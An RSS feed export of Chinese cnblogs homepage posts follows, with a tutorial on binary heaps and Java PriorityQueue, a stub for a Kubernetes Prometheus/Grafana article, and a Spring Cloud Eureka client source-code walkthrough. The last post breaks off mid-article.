<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>一分钟带你读懂什么是堆？ - 码农田小齐</title>
<link>http://www.cnblogs.com/nycsde/p/13772560.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/nycsde/p/13772560.html</guid>
<description>&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;上一篇的 「Java 集合框架」里，还剩下一个大问题没有说的，那就是 PriorityQueue，优先队列，也就是堆，Heap。&lt;/p&gt;
&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span class=&quot;content&quot;&gt;什么是堆？&lt;/span&gt;&lt;/h2&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;堆其实就是一种特殊的队列——优先队列。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;普通的队列游戏规则很简单：就是先进先出；但这种优先队列&lt;strong&gt;搞特殊&lt;/strong&gt;，不是按照进队列的时间顺序，而是按照每个元素的&lt;strong&gt;优先级&lt;/strong&gt;来比拼，&lt;strong&gt;优先级高的在堆顶&lt;/strong&gt;。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这也很容易理解吧，比如各种软件都有会员制度，某软件用了会员就能加速下载的，不同等级的会员速度还不一样，那就是优先级不同呀。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;还有其实每个人回复微信消息也是默默的把消息放进堆里排个序：先回男朋友女朋友的，然后再回其他人的。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这里要区别于操作系统里的那个“堆”，这两个虽然都叫堆，但是没有半毛钱关系，都是借用了 Heap 这个英文单词而已。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们再来回顾一下「&lt;strong&gt;堆&lt;/strong&gt;」在整个 Java 集合框架中的位置：&lt;/p&gt;
&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gjfakb6qp8j30u00ecjuv.jpg&quot; alt=&quot;&quot;/&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;也就是说，&lt;/p&gt;
&lt;ul data-tool=&quot;mdnice编辑器&quot;&gt;&lt;li&gt;
&lt;section&gt;PriorityQueue 是一个类 (class)；&lt;/section&gt;&lt;/li&gt;
&lt;li&gt;
&lt;section&gt;PriorityQueue 继承自 Queue 这个接口 (Interface)；&lt;/section&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;那 heap 在哪呢？&lt;/span&gt;&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;heap 其实是一个&lt;strong&gt;抽象的数据结构&lt;/strong&gt;，或者说是&lt;strong&gt;逻辑上的数据结构&lt;/strong&gt;，并不是一个物理上真实存在的数据结构。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;heap 其实有很多种实现方式，&lt;/span&gt;比如 binomial heap, Fibonacci heap 等等。但是面试最常考的，也是最经典的，就是 &lt;strong&gt;binary heap 二叉堆&lt;/strong&gt;，也就是用一棵&lt;strong&gt;完全二叉树&lt;/strong&gt;来实现的。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;那完全二叉树是怎么实现的？&lt;/span&gt;&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;其实是用&lt;strong&gt;数组&lt;/strong&gt;来实现的！&lt;/p&gt;
&lt;h4 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span class=&quot;content&quot;&gt;所以 binary heap/PriorityQueue 实际上是用&lt;strong&gt;数组&lt;/strong&gt;来实现的。&lt;/span&gt;&lt;/h4&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个数组的排列方式有点特别，因为它总会维护你定义的（或者默认的）&lt;strong&gt;优先级最高的元素&lt;/strong&gt;在数组的首位，所以不是随便一个数组都叫「堆」，实际上，它在你心里，应该是一棵「完全二叉树」。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这棵完全二叉树，只存在你心里和各大书本上；实际在在内存里，哪有什么树？就是数组罢了。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;那为什么完全二叉树可以用数组来实现？是不是所有的树都能用数组来实现？&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个就涉及完全二叉树的性质了，我们下一篇会细讲，简单来说，因为完全二叉树的定义要求了它在层序遍历的时候没有气泡，也就是连续存储的，所以可以用数组来存放；第二个问题当然是否。&lt;/p&gt;
&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span class=&quot;content&quot;&gt;堆的特点&lt;/span&gt;&lt;/h2&gt;
&lt;ol data-tool=&quot;mdnice编辑器&quot;&gt;&lt;li readability=&quot;-2&quot;&gt;
&lt;section readability=&quot;2&quot;&gt;&lt;p&gt;堆是一棵完全二叉树；&lt;/p&gt;
&lt;/section&gt;&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;section readability=&quot;6&quot;&gt;&lt;p&gt;堆序性 (heap order): 任意节点都&lt;strong&gt;优于&lt;/strong&gt;它的&lt;strong&gt;所有孩子&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;a. 如果是任意节点都&lt;strong&gt;大于&lt;/strong&gt;它的所有孩子，这样的堆叫&lt;strong&gt;大顶堆&lt;/strong&gt;，Max Heap;&lt;/p&gt;
&lt;p&gt;b. 如果是任意节点都&lt;strong&gt;小于&lt;/strong&gt;它的所有孩子，这样的堆叫&lt;strong&gt;小顶堆&lt;/strong&gt;，Min Heap;&lt;/p&gt;
&lt;/section&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gjfakq2lckj30sq0aldgw.jpg&quot; alt=&quot;&quot;/&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;左图是小顶堆，可以看出对于每个节点来说，都是小于它的所有孩子的，注意是&lt;strong&gt;所有孩子，包括孙子，曾孙...&lt;/strong&gt;&lt;/p&gt;
&lt;ol start=&quot;3&quot; data-tool=&quot;mdnice编辑器&quot;&gt;&lt;li&gt;
&lt;section&gt;既然堆是用数组来实现的，那么我们可以找到每个节点和它的父母/孩子之间的关系，从而可以直接访问到它们。&lt;/section&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gjfakyp2amj30gp0e5js4.jpg&quot; alt=&quot;&quot;/&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;比如对于节点 3 来说，&lt;/p&gt;
&lt;ul data-tool=&quot;mdnice编辑器&quot;&gt;&lt;li&gt;
&lt;section&gt;它的 Index = 1，&lt;/section&gt;&lt;/li&gt;
&lt;li&gt;
&lt;section&gt;它的 parent index = 0,&lt;/section&gt;&lt;/li&gt;
&lt;li&gt;
&lt;section&gt;左孩子 left child index = 3,&lt;/section&gt;&lt;/li&gt;
&lt;li&gt;
&lt;section&gt;右孩子 right child index = 4.&lt;/section&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;可以归纳出如下规律：&lt;/p&gt;
&lt;ul data-tool=&quot;mdnice编辑器&quot;&gt;&lt;li&gt;
&lt;section&gt;设当前节点的 index = x,&lt;/section&gt;&lt;/li&gt;
&lt;li&gt;
&lt;section&gt;那么 parent index = (x-1)/2,&lt;/section&gt;&lt;/li&gt;
&lt;li&gt;
&lt;section&gt;左孩子 left child index = 2*x + 1,&lt;/section&gt;&lt;/li&gt;
&lt;li&gt;
&lt;section&gt;右孩子 right child index = 2*x + 2.&lt;/section&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有些书上可能写法稍有不同，是因为它们的数组是从 1 开始的，而我这里数组的下标是从 0 开始的，都是可以的。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这样就可以从任意一个点，一步找到它的孙子、曾孙子，真的太方便了，在之后讲具体操作时大家可以更深刻的体会到。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;那有关堆的基本操作，以及为什么 heapify() 是 O(n) 的，我们之后再聊。&lt;/p&gt;
&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gjfalpg6odj30u002q0tt.jpg&quot; alt=&quot;&quot;/&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果你喜欢这篇文章，记得给我点赞留言哦～你们的支持和认可，就是我创作的最大动力，我们下篇文章见！&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;我是小齐，纽约程序媛，终生学习者，每天晚上 9 点，云自习室里不见不散！&lt;/strong&gt;&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;更多干货文章见我的 Github: https://github.com/xiaoqi6666/NYCSDE&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 06 Oct 2020 00:27:00 +0000</pubDate>
<dc:creator>码农田小齐</dc:creator>
<og:description>上一篇的 「Java 集合框架」里，还剩下一个大问题没有说的，那就是 PriorityQueue，优先队列，也就是堆，Heap。 什么是堆？ 堆其实就是一种特殊的队列——优先队列。 普通的队列游戏规则</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/nycsde/p/13772560.html</dc:identifier>
</item>
<item>
<title>kubernetes1.15极速部署prometheus和grafana - 程序员欣宸</title>
<link>http://www.cnblogs.com/bolingcavalry/p/13772518.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bolingcavalry/p/13772518.html</guid>
<description>[unable to retrieve full-text content]关于prometheus和grafana prometheus负责监控数据采集，grafana负责展示，下图来自官网： 环境信息 硬件：三台CentOS 7.7服务器 kubernetes：1.15 prometheus：v2.0.0 grafana：5.0.0 以下是我这边的实战环境： 部署 执行</description>
<pubDate>Mon, 05 Oct 2020 23:49:00 +0000</pubDate>
<dc:creator>程序员欣宸</dc:creator>
<dc:language>zh-CN</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://account.cnblogs.com:443/signin?ReturnUrl=https%3A%2F%2Fwww.cnblogs.com%2Fbolingcavalry%2Fp%2F13772518.html</dc:identifier>
</item>
<item>
<title>Spring Cloud系列（四）：Eureka源码解析之客户端 - toby.xu</title>
<link>http://www.cnblogs.com/toby-xu/p/13771607.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/toby-xu/p/13771607.html</guid>
<description>&lt;h2&gt;一、自动装配&lt;/h2&gt;
&lt;p&gt;　　1、根据自动装配原理（详见：&lt;span&gt;&lt;strong&gt;&lt;a class=&quot;entry&quot; href=&quot;https://www.cnblogs.com/toby-xu/p/13521019.html&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;Spring Boot系列（二）：Spring Boot自动装配原理解析&lt;/span&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/span&gt;），找到spring-cloud-netflix-eureka-client.jar的spring.factories，查看spring.factories如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1761778/202010/1761778-20201005205316737-1831281236.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　2、进入EurekaClient的自动装配类EurekaClientAutoConfiguration：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1761778/202010/1761778-20201005210938910-814841236.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　3、@ConditionalOnBean(EurekaDiscoveryClientConfiguration.Marker.class)也就是说当容器中有EurekaDiscoveryClientCon figuration.Marker.class时，该配置类才起作用。接下来查看spring.factories，发现还有一个配置类EurekaDiscoveryClientConfigura tion，该配置类就刚刚好往容器中导入了EurekaDiscoveryClientConfiguration.Marker。&lt;/p&gt;
&lt;h2&gt;二、EurekaClient&lt;/h2&gt;
&lt;h3&gt;　　1、EurekaClientAutoConfiguration配置类&lt;/h3&gt;
&lt;h4&gt;　　1.1 导入的核心Bean&lt;/h4&gt;
&lt;p&gt;　　① EurekaClientConfigBean：初始化eurekaClient配置；&lt;/p&gt;
&lt;p&gt;　　② EurekaInstanceConfigBean：初始化eureka实例配置；&lt;/p&gt;
&lt;p&gt;　　③ EurekaDiscoveryClient：初始化eureka发现客户端；&lt;/p&gt;
&lt;p&gt;　　④ EurekaServiceRegistry：初始化eureka服务注册；&lt;/p&gt;
&lt;p&gt;　　⑤ EurekaAutoServiceRegistration：初始化eureka自动服务注册；&lt;/p&gt;
&lt;p&gt;　　⑥ EurekaClient：初始化eureka客户端；&lt;/p&gt;
&lt;h4&gt;　　1.2 初始化EurekaClient&lt;/h4&gt;
&lt;p&gt;　　① 首先看下类的继承图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1761778/202010/1761778-20201005222027276-1181436623.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　② CloudEurekaClient构造方法：&lt;/p&gt;
&lt;p&gt;　　点进去会发现它调用父类的构造方法super(applicationInfoManager, config, args);最终来到如下方法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;50&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Inject
    DiscoveryClient(ApplicationInfoManager applicationInfoManager, EurekaClientConfig config, AbstractDiscoveryClientOptionalArgs args,
                    Provider&lt;/span&gt;&amp;lt;BackupRegistry&amp;gt;&lt;span&gt; backupRegistryProvider, EndpointRandomizer endpointRandomizer) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;省略......&lt;/span&gt;
        &lt;span&gt;this&lt;/span&gt;.applicationInfoManager =&lt;span&gt; applicationInfoManager;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;1、获取要注册的服务实例信息&lt;/span&gt;
        InstanceInfo myInfo =&lt;span&gt; applicationInfoManager.getInfo();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;省略......&lt;/span&gt;
        instanceInfo =&lt;span&gt; myInfo;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;省略......
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;2、定义一些Executor&lt;/span&gt;
        &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; default size of 2 - 1 each for heartbeat and cacheRefresh&lt;/span&gt;
            scheduler = Executors.newScheduledThreadPool(2&lt;span&gt;,
                    &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ThreadFactoryBuilder()
                            .setNameFormat(&lt;/span&gt;&quot;DiscoveryClient-%d&quot;&lt;span&gt;)
                            .setDaemon(&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;)
                            .build());
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;心跳Executor&lt;/span&gt;
            heartbeatExecutor = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ThreadPoolExecutor(
                    &lt;/span&gt;1, clientConfig.getHeartbeatExecutorThreadPoolSize(), 0&lt;span&gt;, TimeUnit.SECONDS,
                    &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; SynchronousQueue&amp;lt;Runnable&amp;gt;&lt;span&gt;(),
                    &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ThreadFactoryBuilder()
                            .setNameFormat(&lt;/span&gt;&quot;DiscoveryClient-HeartbeatExecutor-%d&quot;&lt;span&gt;)
                            .setDaemon(&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;)
                            .build()
            );  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; use direct handoff
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;本地缓存刷新Executor&lt;/span&gt;
            cacheRefreshExecutor = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ThreadPoolExecutor(
                    &lt;/span&gt;1, clientConfig.getCacheRefreshExecutorThreadPoolSize(), 0&lt;span&gt;, TimeUnit.SECONDS,
                    &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; SynchronousQueue&amp;lt;Runnable&amp;gt;&lt;span&gt;(),
                    &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ThreadFactoryBuilder()
                            .setNameFormat(&lt;/span&gt;&quot;DiscoveryClient-CacheRefreshExecutor-%d&quot;&lt;span&gt;)
                            .setDaemon(&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;)
                            .build()
            );  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; use direct handoff&lt;/span&gt;
        &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 1、初始化定时拉取服务注册信息和服务续约任务
         * 2、定义一个状态变化监听
         * 3、初始化定时服务注册任务
         &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        initScheduledTasks();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;省略......&lt;/span&gt;
    }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　③ 进入initScheduledTasks()方法如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;54&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; initScheduledTasks() {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (clientConfig.shouldFetchRegistry()) {
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; registryFetchIntervalSeconds =&lt;span&gt; clientConfig.getRegistryFetchIntervalSeconds();
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; expBackOffBound =&lt;span&gt; clientConfig.getCacheRefreshExecutorExponentialBackOffBound();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;每隔30s执行CacheRefreshThread，刷新本地缓存&lt;/span&gt;
&lt;span&gt;            scheduler.schedule(
                    &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; TimedSupervisorTask(
                            &lt;/span&gt;&quot;cacheRefresh&quot;&lt;span&gt;,
                            scheduler,
                            cacheRefreshExecutor,
                            registryFetchIntervalSeconds,
                            TimeUnit.SECONDS,
                            expBackOffBound,
                            &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; DiscoveryClient.CacheRefreshThread()
                    ),
                    registryFetchIntervalSeconds, TimeUnit.SECONDS);
        }

        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (clientConfig.shouldRegisterWithEureka()) {
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; renewalIntervalInSecs =&lt;span&gt; instanceInfo.getLeaseInfo().getRenewalIntervalInSecs();
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; expBackOffBound =&lt;span&gt; clientConfig.getHeartbeatExecutorExponentialBackOffBound();
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;每隔30s发一次心跳&lt;/span&gt;
&lt;span&gt;            scheduler.schedule(
                    &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; TimedSupervisorTask(
                            &lt;/span&gt;&quot;heartbeat&quot;&lt;span&gt;,
                            scheduler,
                            heartbeatExecutor,
                            renewalIntervalInSecs,
                            TimeUnit.SECONDS,
                            expBackOffBound,
                            &lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; DiscoveryClient.HeartbeatThread()
                    ),
                    renewalIntervalInSecs, TimeUnit.SECONDS);

            &lt;/span&gt;&lt;span&gt;//定时服务注册&lt;/span&gt;
            instanceInfoReplicator = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InstanceInfoReplicator(
                    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;,
                    instanceInfo,
                    clientConfig.getInstanceInfoReplicationIntervalSeconds(),
                    &lt;/span&gt;2); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; burstSize
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;状态监听器，当实例状态改变时会调用监听器的notify方法&lt;/span&gt;
            statusChangeListener = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ApplicationInfoManager.StatusChangeListener() {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;省略......&lt;/span&gt;
&lt;span&gt;                @Override
                &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; notify(StatusChangeEvent statusChangeEvent) {
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;省略......&lt;/span&gt;
&lt;span&gt;                    instanceInfoReplicator.onDemandUpdate();
                }
            };

            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (clientConfig.shouldOnDemandUpdateStatusChange()) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;往applicationInfoManager里面注册监听器&lt;/span&gt;
&lt;span&gt;                applicationInfoManager.registerStatusChangeListener(statusChangeListener);
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启定时服务注册任务&lt;/span&gt;
&lt;span&gt;            instanceInfoReplicator.start(clientConfig.getInitialInstanceInfoReplicationIntervalSeconds());
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            logger.info(&lt;/span&gt;&quot;Not registering with Eureka server per configuration&quot;&lt;span&gt;);
        }
    }&lt;/span&gt;　
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　上面方法核心逻辑：&lt;/p&gt;
&lt;p&gt;　　一：初始化定时拉取服务注册信息和服务续约任务；scheduler.schedule(TimedSupervisorTask)，执行TimedSupervisorTask.ru n()方法，定时执行2个任务&lt;/p&gt;
&lt;p&gt;　　Ⅰ、CacheRefreshThread：定时刷新本地注册列表；&lt;/p&gt;
&lt;p&gt;　　Ⅱ、HeartbeatThread：定时向Eureka服务端发送心跳，证明自己还活着；&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1761778/202010/1761778-20201005230633390-1527052391.jpg&quot; alt=&quot;&quot; width=&quot;1123&quot; height=&quot;1499&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　二：定义一个状态变化监听来监听实例状态的变化；&lt;/p&gt;
&lt;p&gt;　　　　statusChangeListener = new ApplicationInfoManager.StatusChangeListener()，里面的核心方法notify(StatusChangeE vent statusChangeEvent)，该方法里面有个instanceInfoReplicator.onDemandUpdate()方法。然后把statusChangeListener监听器往applicationInfoManager里面注册。当实例状态改变时会调用监听器的notify方法，也就是会调用instanceInfoReplicator.onDema ndUpdate()方法。&lt;/p&gt;
&lt;p&gt;　　三：初始化定时服务注册任务；&lt;/p&gt;
&lt;p&gt;　　调用instanceInfoReplicator.start(clientConfig.getInitialInstanceInfoReplicationIntervalSeconds())方法；进入到InstanceInfo Replicator.start(int initialDelayMs)方法如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; start(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; initialDelayMs) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (started.compareAndSet(&lt;span&gt;false&lt;/span&gt;, &lt;span&gt;true&lt;/span&gt;&lt;span&gt;)) {
            instanceInfo.setIsDirty();  &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; for initial register
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;延迟40s执行&lt;/span&gt;
            Future next = scheduler.schedule(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, initialDelayMs, TimeUnit.SECONDS);
            scheduledPeriodicRef.set(next);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　进入到InstanceInfoReplicator.run()方法如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            discoveryClient.refreshInstanceInfo();
            Long dirtyTimestamp &lt;/span&gt;=&lt;span&gt; instanceInfo.isDirtyWithTime();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (dirtyTimestamp != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;服务注册，其实就是调用EurekaServer服务端服务注册接口 httpResponse = eurekaTransport.registrationClient.register(instanceInfo);&lt;/span&gt;
&lt;span&gt;                discoveryClient.register();
                instanceInfo.unsetIsDirty(dirtyTimestamp);
            }
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
            logger.warn(&lt;/span&gt;&quot;There was a problem with the instance info replicator&quot;&lt;span&gt;, t);
        } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;每隔40s执行一次&lt;/span&gt;
            Future next = scheduler.schedule(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, replicationIntervalSeconds, TimeUnit.SECONDS);
            scheduledPeriodicRef.set(next);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;　　1.3 初始化EurekaAutoServiceRegistration&lt;/h4&gt;
&lt;p&gt;　　① EurekaAutoServiceRegistration类的继承图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1761778/202010/1761778-20201005233009627-767452633.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　实现了SmartLifecycle接口，会在EurekaAutoServiceRegistration初始化完成后，根据isAutoStartup为ture执行start方法。&lt;/p&gt;
&lt;p&gt;　　② 进入EurekaAutoServiceRegistration.start()方法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; start() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;省略......&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;this&lt;/span&gt;.running.get() &amp;amp;&amp;amp; &lt;span&gt;this&lt;/span&gt;.registration.getNonSecurePort() &amp;gt; 0&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;服务注册&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.serviceRegistry.register(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.registration);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;发布InstanceRegisteredEvent事件&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.context.publishEvent(&lt;span&gt;new&lt;/span&gt; InstanceRegisteredEvent&amp;lt;&amp;gt;(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;,
                    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.registration.getInstanceConfig()));
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置运行为true&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.running.set(&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　③ 进入EurekaServiceRegistry.register()方法：&lt;/p&gt;
